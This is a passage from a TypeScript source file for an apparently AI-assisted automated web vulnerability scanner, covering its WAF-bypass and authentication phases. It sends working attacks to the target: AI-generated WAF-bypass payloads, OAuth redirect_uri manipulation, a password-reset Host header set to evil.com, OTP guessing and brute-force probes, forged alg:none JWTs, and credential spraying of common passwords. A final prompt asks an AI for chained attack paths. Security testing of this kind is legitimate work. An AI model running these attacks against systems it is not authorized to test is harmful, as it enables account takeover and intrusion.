Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": string, "technique": string, "explanation": string, "expected_impact": string }] }`;

          const mutations = safeJsonParse<{ payloads: { name: string; value: string; target_waf: string; technique: string; explanation: string; expected_impact: string }[] }>(
            await ai.generate(mutationPrompt, true), { payloads: [] }
          );

          for (const mutation of mutations.payloads.slice(0, 5)) {
            this.log(jobId, 'info', `AI mutation payload: ${mutation.name} targeting ${mutation.target_waf}`, {
              technique: mutation.technique, explanation: mutation.explanation,
            });

            // Actually test AI-generated payloads against the target
            let mutationTested = false;
            for (const asset of discoveredAssets.slice(0, 2)) {
              if (mutationTested) break;
              try {
                const sep = asset.includes('?') ? '&' : '?';
                const mutUrl = `${asset}${sep}q=${encodeURIComponent(mutation.value)}`;
                const mutRes = await axios.get(mutUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
                const mutBody = typeof mutRes.data === 'string' ? mutRes.data : JSON.stringify(mutRes.data);
                mutationTested = true;

                // Record with actual test results
                const wasBlocked = [403, 406, 501].includes(mutRes.status);
                MemoryManager.addFinding(jobId, hostname, {
                  type: 'WAF Detection', subtype: 'AI Mutation Payload',
                  endpoint: asset,
                  gap: `${mutation.name}: ${mutation.explanation}`,
                  chain_potential: mutation.expected_impact,
                  payload: mutation.value, target_waf: mutation.target_waf,
                  tested: true, test_status: mutRes.status,
                  test_blocked: wasBlocked, test_body_size: mutBody.length,
                  severity: wasBlocked ? 'INFO' : 'MEDIUM',
                });
                wafCount++;
              } catch {}
            }

            if (!mutationTested) {
              MemoryManager.addFinding(jobId, hostname, {
                type: 'WAF Detection', subtype: 'AI Mutation Payload',
                gap: `${mutation.name}: ${mutation.explanation}`,
                chain_potential: mutation.expected_impact,
                payload: mutation.value, target_waf: mutation.target_waf,
                tested: false, severity: 'INFO',
              });
              wafCount++;
            }
          }
        }

        // Collect Phase 4g findings
        const phase4gMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4gFindings = phase4gMemory.findings.filter((f: Record<string, unknown>) =>
          f.type === 'WAF Detection' || f.type === 'WAF Bypass'
        );
        if (phase4gFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4g', type: 'WAF Detection & Bypass Results', data: phase4gFindings });
          // Only add WAF Bypasses (not detections) to vulnerability count
          const wafVulns = phase4gFindings.filter((f: Record<string, unknown>) => f.type === 'WAF Bypass');
          vulnerabilities.push(...wafVulns.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4g'
          })));
        }
        this.log(jobId, 'info', `Phase 4g complete: ${wafCount} WAF finding(s), ${bypassCount} bypass(es) added to report`);

        // --- PHASE 4h: AUTHENTICATION & AUTHORIZATION DEEP DIVE ---
        this.log(jobId, 'info', 'Phase 4h: Authentication & Authorization Deep Dive');
        this.updateJob(jobId, 'running', 'Phase 4h: Auth Deep Dive');

        let authCount = 0;

        // 4h-1: OAuth flow manipulation
        this.log(jobId, 'info', 'Phase 4h-1: OAuth flow analysis');
        const oauthEndpoints = endpoints.filter((ep: { url: string }) =>
          /oauth|authorize|callback|token|\.well-known\/openid|redirect_uri|client_id|response_type/i.test(ep.url)
        );

        for (const ep of oauthEndpoints.slice(0, 10)) {
          if (authCount >= 12) break;
          try {
            // Test redirect_uri manipulation
            const oauthCanary = `levarg-redirect-test-${Date.now()}`;
            const redirectTests = [
              { name: 'Open redirect in redirect_uri', param: 'redirect_uri', value: `https://${oauthCanary}.com/callback`, canary: oauthCanary },
              { name: 'Subdomain takeover redirect', param: 'redirect_uri', value: `https://${oauthCanary}.${hostname}/callback`, canary: oauthCanary },
              { name: 'Path traversal redirect', param: 'redirect_uri', value: `https://${hostname}/../${oauthCanary}`, canary: oauthCanary },
              { name: 'Fragment injection', param: 'redirect_uri', value: `https://${hostname}/callback#${oauthCanary}`, canary: oauthCanary },
              { name: 'Parameter pollution', param: 'redirect_uri', value: '', canary: oauthCanary, raw: `redirect_uri=${encodeURIComponent(`https://${hostname}/callback`)}&redirect_uri=${encodeURIComponent(`https://${oauthCanary}.com`)}` },
            ];

            for (const test of redirectTests) {
              try {
                const sep = ep.url.includes('?') ? '&' : '?';
                const testUrl = test.raw
                  ? `${ep.url}${sep}${test.raw}`
                  : `${ep.url}${sep}${test.param}=${encodeURIComponent(test.value)}`;
                const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });

                const location = String(res.headers['location'] || '');
                const isRedirected = res.status === 302 || res.status === 301;

                // A genuine open-redirect bypass means the *destination* the
                // browser navigates to includes the canary — its hostname,
                // path, or fragment. The canary leaking back into the query
                // string of a same-origin redirect (e.g.
                // Location: https://www.tiktok.com/passport/...?redirect_uri=https%3A%2F%2Fcanary)
                // is just the server echoing input back as a query param;
                // the browser still navigates to the original same-origin
                // host. Without this guard every redirect_uri-aware OAuth
                // endpoint reports CRITICAL.
                const canaryAttacks = (() => {
                  if (!location) return false;
                  let parsed: URL;
                  try {
                    parsed = new URL(location, ep.url);
                  } catch {
                    return location.includes(test.canary);
                  }
                  return (
                    parsed.hostname.includes(test.canary) ||
                    parsed.pathname.includes(test.canary) ||
                    parsed.hash.includes(test.canary)
                  );
                })();

                if (isRedirected && canaryAttacks) {
                  this.log(jobId, 'vuln', `OAUTH REDIRECT BYPASS [${test.name}]: ${ep.url}`, {
                    redirect_to: location, test: test.name,
                  });
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Auth Vulnerability', subtype: 'OAuth redirect bypass',
                    endpoint: ep.url, technique: test.name,
                    gap: `OAuth redirect_uri accepts ${test.name}: redirects to ${location}`,
                    chain_potential: 'Authorization code theft → account takeover',
                    severity: 'CRITICAL',
                  });
                  authCount++;
                  break; // One redirect bypass per endpoint is enough
                }
              } catch {}
            }

            // Test response_type manipulation
            if (/authorize/i.test(ep.url)) {
              try {
                const sep = ep.url.includes('?') ? '&' : '?';
                const implicitUrl = `${ep.url}${sep}response_type=token`;
                const implicitRes = await axios.get(implicitUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });

                if (implicitRes.status === 302 || implicitRes.status === 200) {
                  const loc = String(implicitRes.headers['location'] || '');
                  const body = typeof implicitRes.data === 'string' ? implicitRes.data : JSON.stringify(implicitRes.data);
                  // Implicit flow leaves the access token in the URL
                  // fragment, e.g. Location: https://app/cb#access_token=<jwt>&token_type=Bearer.
                  // The bare substring 'access_token' appears in every JS
                  // bundle that references the OAuth spec, in API
                  // documentation, in error messages — not a signal. We
                  // require either a fragment-shaped token (#...access_token=<value>)
                  // or an actual JSON token value in the body
                  // ("access_token":"<value>").
                  const fragmentTokenRe = /#[^\s]*access_token=[A-Za-z0-9._\-]{8,}/;
                  const jsonTokenRe = /"access_token"\s*:\s*"[A-Za-z0-9._\-]{8,}"/;
                  const tokenInLocation = fragmentTokenRe.test(loc);
                  const tokenInBody = jsonTokenRe.test(body);
                  if (tokenInLocation || tokenInBody) {
                    this.log(jobId, 'vuln', `IMPLICIT FLOW ENABLED: ${ep.url}`, {
                      where: tokenInLocation ? 'URL fragment' : 'response body',
                    });
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Auth Vulnerability', subtype: 'Implicit flow enabled',
                      endpoint: ep.url,
                      gap: `OAuth implicit flow (response_type=token) is enabled — token returned in ${tokenInLocation ? 'URL fragment' : 'response body'}`,
                      chain_potential: 'Token theft via referrer leak, browser history, or open redirect',
                      severity: 'HIGH',
                    });
                    authCount++;
                  }
                }
              } catch {}
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4h-1 complete: ${authCount} OAuth issue(s) found`);

        // 4h-2: Password reset flow abuse
        this.log(jobId, 'info', 'Phase 4h-2: Password reset flow analysis');
        // Same FP class as 4h-3: a flat substring match on "reset" /
        // "recover" / "restore" / "password" hits unrelated endpoints
        // (session-restore APIs, password-policy help pages, recovery
        // email form pages that aren't the actual reset endpoint).
        // Require a path-segment shape: either an explicit reset-flow term
        // as a complete path component, or a recover/forgot/reset/restore
        // segment reached *through* an auth-context segment.
        const resetPathRe = /(?:^|\/)(?:password[-_]?reset|reset[-_]?password|forgot[-_]?password|password[-_]?recover|reset[-_]?token)(?:\/|$|\?)|\/(?:auth|account|users?|passport|login|signin|sso)\/[^?]*?(?:reset|recover|forgot|restore)\b/i;
        const resetEndpoints = endpoints.filter((ep: { url: string }) => {
          let path: string;
          try {
            path = new URL(ep.url).pathname;
          } catch {
            return false;
          }
          return resetPathRe.test(path);
        });

        for (const ep of resetEndpoints.slice(0, 5)) {
          if (authCount >= 12) break;
          try {
            // Test host header injection in password reset
            const res = await axios.post(ep.url, 'email=test@test.com', {
              timeout: 5000, validateStatus: () => true,
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': `evil.com`,
                'X-Forwarded-Host': 'evil.com',
              },
            });

            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

            // If the server doesn't reject the manipulated host header
            if (res.status !== 400 && res.status !== 403 && res.status < 500) {
              this.log(jobId, 'info', `Password reset accepts manipulated Host header: ${ep.url}`, { status: res.status });

              // Test for user enumeration via reset endpoint
              const enumRes1 = await axios.post(ep.url, 'email=definitely-not-existing-user@nonexistent.test', {
                timeout: 5000, validateStatus: () => true,
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              });
              const enumRes2 = await axios.post(ep.url, 'email=admin@' + hostname, {
                timeout: 5000, validateStatus: () => true,
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              });

              const body1 = typeof enumRes1.data === 'string' ? enumRes1.data : JSON.stringify(enumRes1.data);
              const body2 = typeof enumRes2.data === 'string' ? enumRes2.data : JSON.stringify(enumRes2.data);

              // Require BOTH status difference AND significant body size difference
              // to avoid false positives from CSRF tokens, timestamps, nonces
              const statusDiffers = enumRes1.status !== enumRes2.status;
              const sizeDiffers = Math.abs(body1.length - body2.length) > 200;
              if (statusDiffers && sizeDiffers) {
                this.log(jobId, 'vuln', `USER ENUMERATION via password reset: ${ep.url}`);
                MemoryManager.addFinding(jobId, hostname, {
                  type: 'Auth Vulnerability', subtype: 'User enumeration via reset',
                  endpoint: ep.url,
                  gap: `Password reset endpoint reveals user existence: different responses for valid vs invalid emails (status: ${enumRes1.status} vs ${enumRes2.status}, size: ${body1.length} vs ${body2.length})`,
                  chain_potential: 'Username harvesting → targeted credential attacks',
                  severity: 'MEDIUM',
                });
                authCount++;
              }
            }

            // Test for token predictability in reset links — only match URL params and JSON values
            const tokenMatch = bodyStr.match(/(?:reset_token|verification_code|reset_code|confirm_token|auth_token)[=:]["']?\s*([a-zA-Z0-9._-]{6,})/i)
              || bodyStr.match(/[?&](?:token|code|key)=([a-zA-Z0-9._-]{6,})/i);
            if (tokenMatch) {
              const token = tokenMatch[1];
              if (/^\d+$/.test(token) && token.length < 12) {
                this.log(jobId, 'vuln', `WEAK RESET TOKEN: ${ep.url}`);
                MemoryManager.addFinding(jobId, hostname, {
                  type: 'Auth Vulnerability', subtype: 'Weak reset token',
                  endpoint: ep.url,
                  gap: `Password reset token appears predictable: ${token.length} chars, numeric-only`,
                  chain_potential: 'Token prediction → account takeover',
                  severity: 'CRITICAL',
                });
                authCount++;
              }
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4h-2 complete: ${authCount} auth issue(s) total`);

        // 4h-3: MFA bypass detection
        this.log(jobId, 'info', 'Phase 4h-3: MFA bypass detection');
        // Tightened from a flat substring match against words like "verify"
        // and "challenge", which fired on TikTok's hashtag-challenge feature
        // (`/api/challenge/item_list/`, `/@dailychallenge0`) and any feature
        // page whose path contained "verify". Now we either match an
        // unambiguous MFA term as its own path segment (mfa, 2fa, otp,
        // totp, authenticator, two-factor) OR we require a verify/challenge
        // segment to be reached *through* an auth-context segment
        // (/auth/verify, /passport/2fa, /sso/challenge, /account/verify, …).
        // Public content endpoints that happen to contain "challenge" no
        // longer trigger MFA-class probes.
        const mfaPathRe = /(?:^|\/)(?:mfa|2fa|two[-_.]?factor|otp|totp|authenticator)(?:\/|$|\?)|\/(?:auth|login|signin|sign[-_]in|passport|account|users?|sso|email|phone)\/[^?]*?(?:verify|challenge|confirm)\b/i;
        const mfaEndpoints = endpoints.filter((ep: { url: string }) => {
          let path: string;
          try {
            path = new URL(ep.url).pathname;
          } catch {
            return false;
          }
          return mfaPathRe.test(path);
        });

        for (const ep of mfaEndpoints.slice(0, 5)) {
          if (authCount >= 12) break;
          try {
            // Test if MFA can be skipped by going directly to post-auth pages
            const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

            // Test null/empty OTP
            const nullOtpTests = [
              { value: '', name: 'Empty OTP' },
              { value: '000000', name: 'Zero OTP' },
              { value: '123456', name: 'Common OTP' },
              { value: 'null', name: 'Null string OTP' },
            ];

            for (const otpTest of nullOtpTests) {
              try {
                const otpRes = await axios.post(ep.url, `code=${otpTest.value}&otp=${otpTest.value}&token=${otpTest.value}`, {
                  timeout: 5000, validateStatus: () => true,
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                });

                // If null/zero OTP gets accepted (200 or redirect to dashboard)
                if (otpRes.status === 200 || otpRes.status === 302) {
                  const otpBody = typeof otpRes.data === 'string' ? otpRes.data : JSON.stringify(otpRes.data);
                  const otpLoc = String(otpRes.headers['location'] || '');

                  // Strict validation: reject if any error indicators present, and
                  // for 302 redirects, check the Location header specifically (not body nav links)
                  const hasErrorIndicators = /error|invalid|wrong|failed|expired|denied|unauthorized|incorrect|try again/i.test(otpBody);
                  const hasSuccessRedirect = otpRes.status === 302 && /dashboard|home|account|profile|success|welcome/i.test(otpLoc);
                  const hasSuccessBody = otpRes.status === 200 && /authenticated|logged.?in|welcome.*back|session.?created|mfa.?verified/i.test(otpBody);

                  if (!hasErrorIndicators && (hasSuccessRedirect || hasSuccessBody)) {
                    this.log(jobId, 'vuln', `MFA BYPASS [${otpTest.name}]: ${ep.url}`);
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Auth Vulnerability', subtype: 'MFA bypass',
                      endpoint: ep.url, technique: otpTest.name,
                      gap: `MFA bypass via ${otpTest.name}: endpoint accepts without verification`,
                      chain_potential: 'Complete authentication bypass → full account takeover',
                      severity: 'CRITICAL',
                    });
                    authCount++;
                    break;
                  }
                }
              } catch {}
            }

            // Test rate limiting on OTP endpoint — 25 rapid requests
            let successfulAttempts = 0;
            let hasRateLimitHeaders = false;
            const totalAttempts = 25;
            for (let i = 0; i < totalAttempts; i++) {
              try {
                const bruteRes = await axios.post(ep.url, `code=${100000 + i}&otp=${100000 + i}`, {
                  timeout: 3000, validateStatus: () => true,
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                });
                if (bruteRes.status !== 429 && bruteRes.status < 500) {
                  successfulAttempts++;
                }
                // Check for rate-limit headers even if not 429
                if (bruteRes.headers['x-ratelimit-remaining'] || bruteRes.headers['retry-after'] ||
                    bruteRes.headers['x-rate-limit-remaining'] || bruteRes.headers['ratelimit-remaining']) {
                  hasRateLimitHeaders = true;
                }
                if (bruteRes.status === 429) break; // Rate limited, stop testing
              } catch {}
            }

            // Only flag if ALL attempts passed AND no rate-limit headers present
            if (successfulAttempts >= totalAttempts && !hasRateLimitHeaders) {
              this.log(jobId, 'vuln', `MFA NO RATE LIMIT: ${ep.url} (${successfulAttempts}/${totalAttempts} attempts accepted)`);
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Auth Vulnerability', subtype: 'MFA no rate limit',
                endpoint: ep.url,
                gap: `MFA endpoint has no rate limiting: ${successfulAttempts}/${totalAttempts} rapid attempts accepted, no 429 or rate-limit headers`,
                chain_potential: 'OTP brute force (6-digit = 1M combinations, feasible without rate limiting)',
                severity: 'HIGH',
              });
              authCount++;
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4h-3 complete: ${authCount} auth issue(s) total`);

        // 4h-4: Token scope escalation & JWT deep analysis
        this.log(jobId, 'info', 'Phase 4h-4: Token scope escalation');
        const tokenEndpoints = endpoints.filter((ep: { url: string }) =>
          /token|api|graphql|jwt|bearer|auth/i.test(ep.url)
        );

        for (const ep of tokenEndpoints.slice(0, 8)) {
          if (authCount >= 12) break;
          try {
            const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

            // Look for tokens in responses
            const jwtPattern = /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
            const jwts = bodyStr.match(jwtPattern) || [];

            for (const jwt of jwts.slice(0, 3)) {
              try {
                const parts = jwt.split('.');
                const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
                const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

                const jwtCritical: string[] = [];
                const jwtWarnings: string[] = [];

                // Check algorithm — critical issues
                if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
                  jwtCritical.push('Algorithm set to "none" — signature verification disabled');
                }
                if (header.alg === 'HS256' && header.jwk) {
                  jwtCritical.push('Embedded JWK with HMAC — potential key confusion attack');
                }

                // Check claims — critical if admin access
                if (payload.role === 'admin' || payload.is_admin || payload.admin) {
                  jwtCritical.push(`Admin claim present: ${JSON.stringify({ role: payload.role, is_admin: payload.is_admin, admin: payload.admin })}`);
                }
                if (payload.scope && /admin|write|delete|superuser/i.test(String(payload.scope))) {
                  jwtCritical.push(`Elevated scope: ${payload.scope}`);
                }

                // Missing aud/iss are warnings, not critical — many internal APIs omit them
                if (!payload.aud) {
                  jwtWarnings.push('Missing audience (aud) claim');
                }
                if (!payload.iss) {
                  jwtWarnings.push('Missing issuer (iss) claim');
                }

                // Forge alg:none token and test acceptance against the endpoint
                if (header.alg && header.alg !== 'none') {
                  try {
                    const forgedHeader = Buffer.from(JSON.stringify({ ...header, alg: 'none' })).toString('base64url');
                    const forgedToken = `${forgedHeader}.${parts[1]}.`;

                    const forgedRes = await axios.get(ep.url, {
                      timeout: 5000, validateStatus: () => true,
                      headers: { 'Authorization': `Bearer ${forgedToken}` },
                    });

                    // If forged token gets 200 (not 401/403), server may accept alg:none
                    if (forgedRes.status === 200) {
                      const forgedBody = typeof forgedRes.data === 'string' ? forgedRes.data : JSON.stringify(forgedRes.data);
                      if (!/unauthorized|invalid.*token|jwt.*expired|authentication.*required/i.test(forgedBody)) {
                        jwtCritical.push('Server accepts forged alg:none token — signature verification bypassed');
                      }
                    }
                  } catch {}
                }

                // Only record if critical issues found, or 2+ warnings combined
                const allIssues = [...jwtCritical, ...jwtWarnings];
                if (jwtCritical.length > 0 || jwtWarnings.length >= 2) {
                  this.log(jobId, 'vuln', `JWT WEAKNESS found at ${ep.url}`, { issues: allIssues, algorithm: header.alg });
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Auth Vulnerability', subtype: 'JWT weakness',
                    endpoint: ep.url, gap: allIssues.join('; '),
                    chain_potential: 'Token forgery → privilege escalation → account takeover',
                    severity: jwtCritical.length > 0 ? 'CRITICAL' : 'MEDIUM',
                    details: { algorithm: header.alg, claims: Object.keys(payload) },
                  });
                  authCount++;
                }
              } catch {}
            }
          } catch {}
        }

        // 4h-5: Credential spray against discovered login forms
        this.log(jobId, 'info', 'Phase 4h-5: Credential spray (SecLists top-usernames × top-100 passwords)');
        const loginEndpoints = endpoints.filter((ep: { url: string; method?: string }) =>
          /login|signin|sign-in|authenticate|auth\/token|session/i.test(ep.url)
        );
        const sprayUsernames = getTopUsernames();
        const sprayPasswords = getTopPasswords(100);

        for (const ep of loginEndpoints.slice(0, 3)) {
          if (authCount >= 15) break;
          const origin = new URL(ep.url).origin;
          const sprayHost = new URL(ep.url).hostname;
          this.log(jobId, 'info', `Spraying ${ep.url} (${sprayUsernames.length} users × ${sprayPasswords.length} passwords)`);

          // Baseline: send a known-bad login to capture the "failure" signal
          let baselineStatus = 0;
          let baselineBodySnippet = '';
          try {
            const baseRes = await axios.post(ep.url, {
              username: `__levarg_baseline_${Date.now()}`,
              password: `__levarg_baseline_${Date.now()}`,
            }, { timeout: 5000, validateStatus: () => true });
            baselineStatus = baseRes.status;
            const baseBody = typeof baseRes.data === 'string' ? baseRes.data : JSON.stringify(baseRes.data);
            baselineBodySnippet = baseBody.slice(0, 256);
          } catch { continue; }

          let sprayHit = false;
          for (const user of sprayUsernames) {
            if (sprayHit || authCount >= 15) break;
            for (const pass of sprayPasswords) {
              if (sprayHit || authCount >= 15) break;
              try {
                const res = await axios.post(ep.url, { username: user, password: pass }, {
                  timeout: 5000, validateStatus: () => true, maxRedirects: 0,
                });
                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

                // Success signal: status differs from baseline AND no error keywords
                const statusDiffers = res.status !== baselineStatus;
                const bodyDiffers = body.slice(0, 256) !== baselineBodySnippet;
                const noErrorMarker = !/invalid|incorrect|wrong|denied|fail/i.test(body.slice(0, 512));
                const isRedirect = res.status >= 300 && res.status < 400;

                if ((statusDiffers && noErrorMarker) || isRedirect) {
                  if (bodyDiffers || isRedirect) {
                    this.log(jobId, 'vuln', `CREDENTIAL SPRAY HIT: ${user}:*** at ${ep.url} [${res.status}]`);
                    MemoryManager.addFinding(jobId, sprayHost, {
                      type: 'Auth Vulnerability', subtype: 'Default credential accepted',
                      endpoint: ep.url,
                      gap: `Server accepted default/common credential for user "${user}" — verify manually before reporting`,
                      chain_potential: 'Account takeover → full application access',
                      severity: 'CRITICAL',
                      details: { username: user, response_status: res.status },
                    });
                    authCount++;
                    sprayHit = true;
                  }
                }

                // Rate-limit: 1 request per second per host
                await new Promise(r => setTimeout(r, 1000));
              } catch { /* network error — skip this combo */ }
            }
          }
        }
        this.log(jobId, 'info', `Phase 4h-5 complete: ${authCount} auth issue(s) total`);

        // 4h-6: AI-driven auth chain synthesis
        if (ai && authCount > 0) {
          this.log(jobId, 'info', 'Phase 4h-6: AI auth vulnerability synthesis');
          const authMemory = MemoryManager.getMemory(jobId, hostname);
          const authFindings = authMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Auth Vulnerability');

          if (authFindings.length >= 2) {
            const authPrompt = `Analyze the following authentication and authorization vulnerabilities for ${targetUrl}.

Findings:
${JSON.stringify(authFindings.slice(-15), null, 2)}

Tech Stack: ${JSON.stringify(discoveredInfo.identifiers || {})}
OAuth endpoints: ${oauthEndpoints.length}
MFA endpoints: ${mfaEndpoints.length}
Reset endpoints: ${resetEndpoints.length}

Your task:
1. Identify authentication chain attacks — how can multiple auth weaknesses be combined?
2. Assess the overall authentication posture
3. Propose realistic attack scenarios with step-by-step paths
4. Rate critical auth gaps that need immediate remediation

Return JSON: {
  "auth_posture": "CRITICAL" | "WEAK" | "MODERATE" | "STRONG",
  "attack_chains": [{ "name": string, "steps": string[], "findings_used": string[], "impact": string, "feasibility": number }],
  "critical_gaps": string[],
  "recommendations": string[]
}`;

            const authAnalysis = safeJsonParse<{
              auth_posture: string; attack_chains: { name: string; steps: string[]; findings_used: string[]; impact: string; feasibility: number }[];
              critical_gaps: string[]; recommendations: string[];
            }>(await ai.generate(authPrompt, true), {
              auth_posture: 'UNKNOWN', attack_chains: [], critical_gaps: [], recommendations: []
            });

            for (const chain of authAnalysis.attack_chains.filter(c => c.feasibility > 0.6)) {
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Auth Vulnerability', subtype: 'Auth chain attack',
                gap: chain.impact, chain_potential: chain.name,
                steps: chain.steps, findings_used: chain.findings_used,
                severity: 'CRITICAL',
              });
              authCount++;
            }

            this.log(jobId, 'info', `Auth posture assessment: ${authAnalysis.auth_posture}`, {
              critical_gaps: authAnalysis.critical_gaps,
              recommendations: authAnalysis.recommendations,
            });
          }
        }

        // Collect Phase 4h findings
        const phase4hMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4hFindings = phase4hMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Auth Vulnerability');
        if (phase4hFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4h', type: 'Auth & Authorization Results', data: phase4hFindings });
          vulnerabilities.push(...phase4hFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4h'
          })));
        }
        this.log(jobId, 'info', `Phase 4h complete: ${authCount} auth finding(s) added to report`);

        // --- PHASE 5: REPORTING (FINAL SYNTHESIS) ---
        this.updateJob(jobId, 'running', 'Phase 5: Reporting');
        this.log(jobId, 'info', 'Starting Phase 5: Final Report Synthesis');

        const finalReport = {
          target: targetUrl,
          timestamp: new Date().toISOString(),
          summary: {
            assets: discoveredAssets.length,
            endpoints: endpoints.length,
            vulnerabilities: vulnerabilities.length
          },
          detailed_findings: allFindings
        };

        this.log(jobId, 'info', 'Hunt completed.', { summary: finalReport.summary });
        this.updateJob(jobId, 'completed', 'completed', allFindings);

      } catch (err: any) {
        this.log(jobId, 'error', `Hunt failed at ${err.message}`);
        this.updateJob(jobId, 'failed');
      } finally {
        this.activeJobs--;
      }
      });
    }, 0);

    return jobId;
  }
}
